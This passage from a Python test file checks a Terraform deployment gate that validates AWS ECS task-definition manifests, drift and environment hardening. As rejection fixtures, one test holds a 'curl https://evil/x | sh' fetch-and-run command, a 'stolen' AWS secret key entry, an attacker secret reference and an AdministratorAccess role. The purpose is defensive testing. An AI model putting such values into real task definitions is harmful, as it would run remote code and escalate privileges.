    assert json.loads(capsys.readouterr().out) == CONTEXT.validate_consumer_manifest(manifest)


def test_consumer_manifest_normalizes_environment_order_deterministically() -> None:
    manifest = _consumer_manifest()
    environment = manifest["consumers"][0]["after"]["task_definition"]["container_definitions"][0][
        "environment"
    ]
    environment.reverse()

    validated = CONTEXT.validate_consumer_manifest(manifest)

    assert validated["mode"] == "no-image-transition"
    assert [
        entry["name"]
        for entry in validated["consumers"][0]["after"]["task_definition"]["container_definitions"][
            0
        ]["environment"]
    ] == ["A_FIRST", "Z_LAST"]


@pytest.mark.parametrize("collection_change", ["addition", "deletion", "reordering"])
def test_consumer_manifest_treats_container_collection_changes_as_receipt_required(
    collection_change: str,
) -> None:
    manifest = _consumer_manifest(pre_media_cutover=False)
    task_definitions = [
        manifest["consumers"][0][phase]["task_definition"] for phase in ("live", "before", "after")
    ]
    sidecar = json.loads(json.dumps(task_definitions[0]["container_definitions"][0]))
    sidecar["name"] = "security-sidecar"
    sidecar["image"] = (
        f"718959508629.dkr.ecr.ap-northeast-1.amazonaws.com/teamagent-mcp@sha256:{'e' * 64}"
    )
    if collection_change == "addition":
        task_definitions[2]["container_definitions"].append(sidecar)
    else:
        for task_definition in task_definitions:
            task_definition["container_definitions"].append(json.loads(json.dumps(sidecar)))
        if collection_change == "deletion":
            task_definitions[2]["container_definitions"].pop()
        else:
            task_definitions[2]["container_definitions"].reverse()
    manifest["mode"] = "receipt-required"

    validated = CONTEXT.validate_consumer_manifest(manifest)

    assert validated["mode"] == "receipt-required"


def test_activation_enable_requires_receipt_mode_and_rejects_mode_downgrade() -> None:
    plan = _plan(pre_media_cutover=False)
    canary = _manifest_consumer(plan, "canary")
    canary["after"]["activation"]["state"] = "ENABLED"
    plan["variables"]["image_deployment_consumer_manifest"]["value"]["mode"] = "receipt-required"
    rule = _resource_change(
        plan,
        "aws_cloudwatch_event_rule.canary_hourly[0]",
    )
    rule["change"]["actions"] = ["update"]
    rule["change"]["after"]["state"] = "ENABLED"

    value = CONTEXT.build_context(
        plan=plan,
        state=_state(pre_media_cutover=False),
        backend_metadata=_backend(),
        workspace="default",
    )

    assert value["consumer_manifest"]["mode"] == "receipt-required"

    downgraded = plan["variables"]["image_deployment_consumer_manifest"]["value"]
    downgraded["mode"] = "no-image-transition"
    with pytest.raises(CONTEXT.ContextError, match="derived comparison"):
        CONTEXT.validate_consumer_manifest(downgraded)


@pytest.mark.parametrize(
    ("mutation", "message"),
    [
        (
            lambda manifest: manifest["consumers"][0].update(release_repository="hostile"),
            "identity does not match",
        ),
        (
            lambda manifest: manifest["consumers"][0]["after"].update(image=None),
            r"after\.image is not the registry repository digest",
        ),
    ],
)
def test_consumer_manifest_rejects_repository_unknown_and_live_before_drift(
    mutation: Any,
    message: str,
) -> None:
    manifest = _consumer_manifest()
    mutation(manifest)

    with pytest.raises(CONTEXT.ContextError, match=message):
        CONTEXT.validate_consumer_manifest(manifest)


def test_consumer_manifest_rejects_before_image_task_definition_drift() -> None:
    manifest = _consumer_manifest()
    manifest["consumers"][0]["before"]["image"] = (
        f"718959508629.dkr.ecr.ap-northeast-1.amazonaws.com/teamagent-mcp@sha256:{'f' * 64}"
    )

    with pytest.raises(
        CONTEXT.ContextError,
        match="before task definition does not bind the registry container image",
    ):
        CONTEXT.validate_consumer_manifest(manifest)


def test_consumer_manifest_rejects_mode_mismatch_after_snapshot_binding() -> None:
    manifest = _consumer_manifest()
    consumer = manifest["consumers"][0]
    before_image = (
        f"718959508629.dkr.ecr.ap-northeast-1.amazonaws.com/teamagent-mcp@sha256:{'f' * 64}"
    )
    consumer["before"]["image"] = before_image
    registry_container = next(
        container
        for container in consumer["before"]["task_definition"]["container_definitions"]
        if container["name"] == consumer["container_name"]
    )
    registry_container["image"] = before_image

    with pytest.raises(
        CONTEXT.ContextError,
        match="mode does not match the derived comparison",
    ):
        CONTEXT.validate_consumer_manifest(manifest)


@pytest.mark.parametrize(
    ("field", "malicious_value"),
    [
        ("command", ["/bin/sh", "-c", "curl https://evil/x | sh"]),
        ("environment", [{"name": "AWS_SECRET_ACCESS_KEY", "value": "stolen"}]),
        (
            "secrets",
            [
                {
                    "name": "ATTACKER_SECRET",
                    "valueFrom": (
                        "arn:aws:secretsmanager:ap-northeast-1:718959508629:secret:attacker"
                    ),
                }
            ],
        ),
        (
            "task_role_arn",
            "arn:aws:iam::718959508629:role/AdministratorAccess",
        ),
    ],
)
@pytest.mark.parametrize(
    ("manifest_tracks_plan", "message"),
    [
        (True, "derived comparison"),
        (False, "plan after task definition differs from the manifest"),
    ],
)
def test_no_image_transition_rejects_task_definition_body_attacks(
    field: str,
    malicious_value: Any,
    manifest_tracks_plan: bool,
    message: str,
) -> None:
    plan = _plan()
    mcp = _manifest_consumer(plan, "mcp")
    task_change = _resource_change(
        plan,
        mcp["terraform_task_definition_address"],
    )["change"]
    if field == "task_role_arn":
        task_change["after"][field] = malicious_value
    else:
        containers = json.loads(task_change["after"]["container_definitions"])
        containers[0][field] = malicious_value
        task_change["after"]["container_definitions"] = json.dumps(
            containers,
            separators=(",", ":"),
        )
    if manifest_tracks_plan:
        mcp["after"]["task_definition"] = CONTEXT._container_binding(
            task_change["after"],
            family=mcp["ecs_family"],
            container_name=mcp["container_name"],
            label="malicious plan after task definition",
        )["task_definition"]

    assert mcp["live"]["image"] == mcp["before"]["image"] == mcp["after"]["image"]
    with pytest.raises(CONTEXT.ContextError, match=message):
        CONTEXT.build_context(
            plan=plan,
            state=_state(),
            backend_metadata=_backend(),
            workspace="default",
        )


def test_no_image_transition_rejects_unknown_task_definition_after() -> None:
    plan = _plan()
    task = _resource_change(
        plan,
        REGISTRY["consumers"][0]["terraform_task_definition_address"],
    )
    task["change"]["after_unknown"] = {"container_definitions": True}

    with pytest.raises(
        CONTEXT.ContextError,
        match=re.escape("plan after task definition.container_definitions is unknown"),
    ):
        CONTEXT.build_context(
            plan=plan,
            state=_state(),
            backend_metadata=_backend(),
            workspace="default",
        )


def test_task_definition_after_unknown_allowlist_matches_runtime_guard() -> None:
    body = COMPOSED_GUARD.read_text(encoding="utf-8")
    allowlist_match = re.search(
        r"\[\$change\.change\.after_unknown // \{\} \| paths\(\. == true\)\] -\s*"
        r"(?P<allowlist>\[\[.*?\]\])\)\s*\|\s*length == 0\)",
        body,
        re.DOTALL,
    )

    assert allowlist_match is not None
    runtime_guard_allowlist = frozenset(
        tuple(path) for path in json.loads(allowlist_match.group("allowlist"))
    )
    assert CONTEXT.TASK_DEFINITION_AFTER_UNKNOWN_ALLOWLIST == runtime_guard_allowlist


def test_no_image_transition_accepts_exact_benign_volume_unknown() -> None:
    plan = _plan()
    openclaw = _manifest_consumer(plan, "openclaw")
    address = openclaw["terraform_task_definition_address"]
    openclaw["after"]["task_definition_arn"] = address
    openclaw["after"]["activation"]["task_definition_arn"] = address

    task_change = _resource_change(plan, address)["change"]
    task_change["actions"] = ["create", "delete"]
    task_change["after"]["arn"] = None
    task_change["after"]["id"] = None
    task_change["after"]["volume"][0]["configure_at_launch"] = None
    task_change["after_unknown"] = {
        "arn": True,
        "id": True,
        "revision": True,
        "volume": [{"configure_at_launch": True}],
    }

    service_change = _resource_change(
        plan,
        "aws_ecs_service.openclaw[0]",
    )["change"]
    service_change["actions"] = ["update"]
    service_change["after"]["task_definition"] = None

    value = CONTEXT.build_context(
        plan=plan,
        state=_state(),
        backend_metadata=_backend(),
        workspace="default",
    )

    accepted = next(
        consumer
        for consumer in value["consumer_manifest"]["consumers"]
        if consumer["consumer_id"] == "openclaw"
    )
    volumes = accepted["after"]["task_definition"]["volumes"]
    assert task_change["after"]["volume"][0]["configure_at_launch"] is None
    assert volumes[0]["configure_at_launch"] is False
    assert volumes[1]["efs_volume_configuration"] == [
        {
            "authorization_config": [
                {
                    "access_point_id": "fsap-0123456789abcdef0",  # gitleaks:allow 合成フィクスチャID
                    "iam": "ENABLED",
                }
            ],
            "file_system_id": "fs-0123456789abcdef0",
            "root_directory": "/",
            "transit_encryption": "ENABLED",
            "transit_encryption_port": None,
        }
    ]


def test_no_image_transition_rejects_unknown_volume_under_its_provider_name() -> None:
    # after_unknown speaks the provider's singular "volume". The gate used to look
    # only for the canonical "volumes", so a plan could leave its mounts
    # computed-at-apply and still be approved.
    plan = _plan()
    task = _resource_change(
        plan,
        REGISTRY["consumers"][0]["terraform_task_definition_address"],
    )
    task["change"]["after_unknown"] = {"volume": True}

    with pytest.raises(
        CONTEXT.ContextError,
        match=re.escape("plan after task definition.volumes is unknown"),
    ):
        CONTEXT.build_context(
            plan=plan,
            state=_state(),
            backend_metadata=_backend(),
            workspace="default",
        )


@pytest.mark.parametrize(
    "after_unknown",
    [
        pytest.param(
            {"volume": [{"name": True}]},
            id="name",
        ),
        pytest.param(
            {"volume": [{"host_path": True}]},
            id="host-path",
        ),
        pytest.param(
            {
                "volume": [
                    {
                        "efs_volume_configuration": [
                            {
                                "file_system_id": True,
                            }
                        ]
                    }
                ]
            },
            id="efs-file-system-id",
        ),
        pytest.param(
            {
                "volume": [
                    {},
                    {
                        "configure_at_launch": True,
                    },
                ]
            },
            id="configure-at-launch-on-volume-one",
        ),
    ],
)
def test_no_image_transition_rejects_security_sensitive_nested_volume_unknown(
    after_unknown: dict[str, Any],
) -> None:
    plan = _plan()
    openclaw = _manifest_consumer(plan, "openclaw")
    task = _resource_change(
        plan,
        openclaw["terraform_task_definition_address"],
    )
    task["change"]["after_unknown"] = after_unknown

    with pytest.raises(
        CONTEXT.ContextError,
        match=re.escape("plan after task definition.volumes is unknown"),
    ):
        CONTEXT.build_context(
            plan=plan,
            state=_state(),
            backend_metadata=_backend(),
            workspace="default",
        )


@pytest.mark.parametrize(
    ("mismatch", "message"),
    [
        ("live_image", "live task definition differs from the manifest"),
        ("live_arn", "live task definition differs from the manifest"),
        ("live_body", "live task definition differs from the manifest"),
        ("before_image", "plan before task definition differs from the manifest"),
        ("before_arn", "plan before task definition differs from the manifest"),
        ("before_body", "plan before task definition differs from the manifest"),
        ("after_image", "plan after task definition differs from the manifest"),
        ("after_arn", "plan after task definition differs from the manifest"),
        ("after_body", "plan after task definition differs from the manifest"),
        ("missing", "consumer set does not match"),
        ("extra", "consumer set does not match"),
    ],
)
def test_manifest_plan_binding_rejects_manifest_state_disagreement(
    mismatch: str,
    message: str,
) -> None:
    plan = _plan()
    state = _state()
    manifest = CONTEXT.validate_consumer_manifest(_consumer_manifest())
    assert (
        CONTEXT._manifest_plan_binding(
            manifest=manifest,
            plan=plan,
            state=state,
        )["consumer_count"]
        == 8
    )

    first = manifest["consumers"][0]
    if mismatch.endswith("_image"):
        phase = mismatch.removesuffix("_image")
        first[phase]["image"] = (
            f"718959508629.dkr.ecr.ap-northeast-1.amazonaws.com/teamagent-mcp@sha256:{'f' * 64}"
        )
    elif mismatch.endswith("_arn"):
        phase = mismatch.removesuffix("_arn")
        first[phase]["task_definition_arn"] = _task_arn(
            REGISTRY["consumers"][0],
            revision=2,
        )
    elif mismatch.endswith("_body"):
        phase = mismatch.removesuffix("_body")
        first[phase]["task_definition"]["task_role_arn"] = (
            "arn:aws:iam::718959508629:role/AdministratorAccess"
        )
    elif mismatch == "missing":
        manifest["consumers"].pop()
    else:
        manifest["consumers"].append(json.loads(json.dumps(first)))

    with pytest.raises(CONTEXT.ContextError, match=message):
        CONTEXT._manifest_plan_binding(
            manifest=manifest,
            plan=plan,
            state=state,
        )


def test_manifest_plan_binding_rejects_consumer_absent_from_live_state() -> None:
    state = _state()
    address = REGISTRY["consumers"][0]["terraform_task_definition_address"]
    state["resources"] = [
        resource
        for resource in state["resources"]
        if not (
            resource["type"] == "aws_ecs_task_definition"
            and f"{resource['type']}.{resource['name']}" == address
        )
    ]

    with pytest.raises(CONTEXT.ContextError, match="absent from state"):
        CONTEXT._manifest_plan_binding(
            manifest=CONTEXT.validate_consumer_manifest(_consumer_manifest()),
            plan=_plan(),
            state=state,
        )


def test_context_accepts_already_disabled_consumer_only_when_resources_are_absent() -> None:
    plan = _plan()
    state = _state()
    _make_consumer_already_absent(plan, state, "x_buzz_worker")

    value = CONTEXT.build_context(
        plan=plan,
        state=state,
        backend_metadata=_backend(),
        workspace="default",
    )

    assert value["consumer_manifest"]["mode"] == "no-image-transition"
    x_consumer = next(
        consumer
        for consumer in value["consumer_manifest"]["consumers"]
        if consumer["consumer_id"] == "x_buzz_worker"
    )
    assert x_consumer["live"] == x_consumer["before"] == x_consumer["after"] == {"absent": True}

    state_with_hidden_task = _state()
    with pytest.raises(CONTEXT.ContextError, match="must be absent from state"):
        CONTEXT.build_context(
            plan=plan,
            state=state_with_hidden_task,
            backend_metadata=_backend(),
            workspace="default",
        )


def test_context_absent_to_present_requires_receipt_and_exact_create_actions() -> None:
    plan = _plan(pre_media_cutover=False)
    state = _state(pre_media_cutover=False)
    _make_connect_web_absent_to_present(plan, state)

    value = CONTEXT.build_context(
        plan=plan,
        state=state,
        backend_metadata=_backend(),
        workspace="default",
    )

    assert value["consumer_manifest"]["mode"] == "receipt-required"
    connect_web = next(
        consumer
        for consumer in value["consumer_manifest"]["consumers"]
        if consumer["consumer_id"] == "connect_web"
    )
    assert connect_web["live"] == connect_web["before"] == {"absent": True}
    assert not CONTEXT.consumer_snapshot_is_absent(connect_web["after"])

    wrong_action = _plan(pre_media_cutover=False)
    wrong_action_state = _state(pre_media_cutover=False)
    _make_connect_web_absent_to_present(wrong_action, wrong_action_state)
    _resource_change(
        wrong_action,
        "aws_ecs_task_definition.connect_web[0]",
    )["change"]["actions"] = ["delete", "create"]
    with pytest.raises(CONTEXT.ContextError, match="must be a create"):
        CONTEXT.build_context(
            plan=wrong_action,
            state=wrong_action_state,
            backend_metadata=_backend(),
            workspace="default",
        )


def test_absent_manifest_cannot_hide_a_planned_consumer_create() -> None:
    plan = _plan()
    state = _state()
    _make_consumer_already_absent(plan, state, "x_buzz_worker")
    registry_consumer = next(
        consumer for consumer in REGISTRY["consumers"] if consumer["consumer_id"] == "x_buzz_worker"
    )
    attributes = _task_attributes(registry_consumer, 6)
    plan["resource_changes"].append(
        {
            "address": registry_consumer["terraform_task_definition_address"],
            "mode": "managed",
            "change": {
                "actions": ["create"],
                "before": None,
                "after": attributes,
            },
        }
    )

    with pytest.raises(CONTEXT.ContextError, match="must have no planned resource"):
        CONTEXT.build_context(
            plan=plan,
            state=state,
            backend_metadata=_backend(),
            workspace="default",
        )


@pytest.mark.parametrize("binding", ["catalog", "consumer", "channel"])
def test_no_image_transition_rejects_receipt_or_channel_mixing(
    binding: str,
) -> None:
    plan = _plan()
    if binding == "catalog":
        plan["variables"]["image_release_receipt_catalog"]["value"] = {"a" * 64: {"key": "unused"}}
    elif binding == "consumer":
        plan["variables"]["image_release_consumer_receipt_bindings"]["value"] = {"mcp": "a" * 64}
    else:
        _resource_change(
            plan,
            "terraform_data.production_image_release_gate",
        )["change"]["after"]["input"]["release_channels"] = {"mcp": "active"}

    with pytest.raises(CONTEXT.ContextError, match="requires empty"):
        CONTEXT.build_context(
            plan=plan,
            state=_state(),
            backend_metadata=_backend(),
            workspace="default",
        )


def test_no_image_transition_accepts_only_its_scheduled_task_pointer() -> None:
    plan = _plan()
    mcp = _manifest_consumer(plan, "mcp")
    address = mcp["terraform_task_definition_address"]
    mcp["after"]["task_definition_arn"] = address
    mcp["after"]["activation"]["task_definition_arn"] = address
    task = _resource_change(plan, address)
    task["change"]["actions"] = ["delete", "create"]
    task["change"]["after"]["arn"] = None
    task["change"]["after"]["id"] = None
    service = _resource_change(plan, "aws_ecs_service.mcp")
    service["change"]["actions"] = ["update"]
    service["change"]["after"]["task_definition"] = None

    value = CONTEXT.build_context(
        plan=plan,
        state=_state(),
        backend_metadata=_backend(),
        workspace="default",
    )

    assert value["consumer_manifest"]["mode"] == "no-image-transition"
    assert value["consumer_manifest"]["consumers"][0]["after"]["task_definition_arn"] == address

    _configuration_resource(plan, "aws_ecs_service.mcp")["expressions"]["task_definition"][
        "references"
    ] = ["aws_ecs_task_definition.openclaw[0].arn"]
    with pytest.raises(CONTEXT.ContextError, match="does not reference only"):
        CONTEXT.build_context(
            plan=plan,
            state=_state(),
            backend_metadata=_backend(),
            workspace="default",
        )


def test_public_activation_state_validator_rechecks_all_eight_after_apply() -> None:
    manifest = _consumer_manifest()
    live = CONTEXT.validate_consumer_activation_state(
        manifest,
        _state(),
        phase="live",
    )
    after = CONTEXT.validate_consumer_activation_state(
        manifest,
        _state(),
        phase="after",
    )

    assert live["consumer_count"] == after["consumer_count"] == 8
    assert live["activation_edges_sha256"] == after["activation_edges_sha256"]

    planned = _consumer_manifest()
    planned_mcp = next(
        consumer for consumer in planned["consumers"] if consumer["consumer_id"] == "mcp"
    )
    planned_address = planned_mcp["terraform_task_definition_address"]
    planned_mcp["after"]["task_definition_arn"] = planned_address
    planned_mcp["after"]["activation"]["task_definition_arn"] = planned_address
    resolved = CONTEXT.validate_consumer_activation_state(
        planned,
        _state(),
        phase="after",
    )
    assert resolved["consumer_count"] == 8

    disabled_plan = _plan()
    disabled_state = _state()
    _make_consumer_already_absent(
        disabled_plan,
        disabled_state,
        "x_buzz_worker",
    )
    disabled = CONTEXT.validate_consumer_activation_state(
        disabled_plan["variables"]["image_deployment_consumer_manifest"]["value"],
        disabled_state,
        phase="after",
    )
    assert disabled["consumer_count"] == 8

    drifted_state = _state()
    canary_rule = next(
        resource
        for resource in drifted_state["resources"]
        if resource["type"] == "aws_cloudwatch_event_rule" and resource["name"] == "canary_hourly"
    )
    canary_rule["instances"][0]["attributes"]["state"] = "ENABLED"
    with pytest.raises(CONTEXT.ContextError, match="activation edge differs"):
        CONTEXT.validate_consumer_activation_state(
            manifest,
            drifted_state,
            phase="after",
        )

    with pytest.raises(CONTEXT.ContextError, match="phase"):
        CONTEXT.validate_consumer_activation_state(
            manifest,
            _state(),
            phase="before",
        )


def test_launchers_reject_injected_terraform_environment_and_unsafe_plan_modes() -> None:
    plan_body = PLAN_SCRIPT.read_text(encoding="utf-8")
    apply_body = APPLY_SCRIPT.read_text(encoding="utf-8")
    body = COMPOSED_GUARD.read_text(encoding="utf-8")

    for retired in (plan_body, apply_body):
        assert "Retired:" in retired
        assert "exit 64" in retired
    assert "compgen -e | LC_ALL=C sort" in body
    assert "Terraform CLIへ影響する環境変数を消去して拒否しました" in body
    assert "TF_WORKSPACE|TF_DATA_DIR|TF_VAR_*" in body
    assert "TF_CLI_ARGS|TF_CLI_ARGS_*" in body
    assert "export AWS_IGNORE_CONFIGURED_ENDPOINT_URLS=true" in body
    assert "AWS_ENDPOINT_URL|AWS_ENDPOINT_URL_*|AWS_PROFILE|AWS_DEFAULT_PROFILE" in body
    assert 'AWS_DEFAULT_REGION="$REGION"' in body
    assert "AWS_CONFIG_FILE=/dev/null" in body
    assert "AWS_SHARED_CREDENTIALS_FILE=/dev/null" in body
    assert "teamagent-dev-terraform-runtime-automation/teamagent-terraform-worker" in body
    assert "TF_ARGS=(" in body
    assert "-refresh=true" in body
    assert "-lock-timeout=5m" in body
    assert 'terraform -chdir="$TF_DIR" "${TF_ARGS[@]}"' in body
    assert 'terraform -chdir="$TF_DIR" "$@"' not in body
    assert "-target=" not in body
    assert "image_release_context.py" in body
    assert "acquire-deployment-lock" in body
    assert "validate-deployment-preflight" in body
    assert "terraform_apply_supervisor.py" in body
    supervisor = (ROOT / "infra" / "terraform" / "terraform_apply_supervisor.py").read_text(
        encoding="utf-8"
    )
    assert "heartbeat-deployment-lock" in supervisor
    assert "start_new_session=True" in supervisor
    assert "os.killpg" in supervisor
    assert "release-deployment-lock" in body
    assert '"-lock-timeout=5m",' in supervisor
